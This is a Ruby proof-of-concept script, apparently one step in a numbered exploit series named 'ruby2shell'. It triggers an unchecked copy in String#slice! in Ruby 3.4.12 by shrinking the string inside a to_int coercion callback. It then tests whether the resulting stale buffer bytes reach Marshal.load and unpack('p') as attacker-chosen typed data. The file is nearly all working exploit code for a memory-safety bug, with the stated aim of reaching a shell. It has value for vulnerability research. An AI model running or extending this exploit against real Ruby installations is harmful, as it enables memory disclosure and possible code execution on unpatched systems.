# W337: feed the stale slice! tail into a live downstream consumer.
#
# W336 showed chosen bytes at chosen offsets in the String returned by the
# unchecked 3.4.12 copy at string.c:6066 (3.4.13 clamps at :6065-6067).
# This probe asks whether those bytes survive as *typed data* in a real
# consumer: Marshal.load interprets a fake Marshal header carried past the
# post-coercion length, and String#unpack("p") is the pointer-consuming
# control. No monkey patch, debugger write, wire or external process.
#
# Usage: ruby ruby2shell-slice-bang-consumer.rb
# Env: W337_ARM=marshal_fixnum|marshal_string|unpackp
#      W337_COERCE=1 (default) | 0 (integer index control)
arm    = ENV.fetch("W337_ARM", "marshal_fixnum")
coerce = ENV.fetch("W337_COERCE", "1") == "1"

case arm
when "marshal_fixnum"
  # Full payload: Marshal fixnum 0x00abca00. The 4-byte head ends at the
  # length byte; replace() puts a NUL at index 4 (the low data byte), and
  # the two remaining data bytes are stale buffer content.
  full = [4, 8, 105, 3, 0, 202, 171].pack("C*").b
  head = [4, 8, 105, 3].pack("C*").b
  consumer = ->(o) { Marshal.load(o) }
when "marshal_string"
  # Full payload: Marshal.dump("XWNED"). Head keeps the type and length
  # bytes; the first string byte is zeroed by replace(), the rest is stale.
  full = Marshal.dump("XWNED").b
  head = full.bytes.first(5).pack("C*").b
  consumer = ->(o) { Marshal.load(o) }
when "unpackp"
  # Pointer-consuming control. Ruby associates pack("p") pointers with
  # their source String and refuses to dereference a copied pointer.
  secret = "SECRET"
  full = ("Z" * 5).b + [secret].pack("p").b + ("Z" * 8).b
  head = ("Z" * 5).b
  consumer = ->(o) { o.unpack("@5p")[0] }
else
  abort "unknown W337_ARM #{arm}"
end

$s = full
idx = if coerce
        o = Object.new
        o.define_singleton_method(:to_int) do
          $s.replace(head)
          1
        end
        o
      else
        1
      end

begin
  out = $s.slice!(/(.*)/m, idx)
  bytes = out ? out.bytes : []
  begin
    value = consumer.call(out.to_s)
    consumed = "VALUE=#{value.inspect}"
  rescue => e
    consumed = "RAISED=#{e.class}:#{e.message}"
  end
  printf("RESULT arm=%s coerce=%d rlen=%d slen=%d head=%s tail=%s consumed=%s\n",
         arm, coerce ? 1 : 0, bytes.length, $s.bytesize,
         bytes.first(16).map { |x| "%02x" % x }.join,
         bytes.last(8).map { |x| "%02x" % x }.join, consumed)
rescue => e
  printf("RESULT arm=%s coerce=%d raised=%s:%s\n",
         arm, coerce ? 1 : 0, e.class, e.message)
end
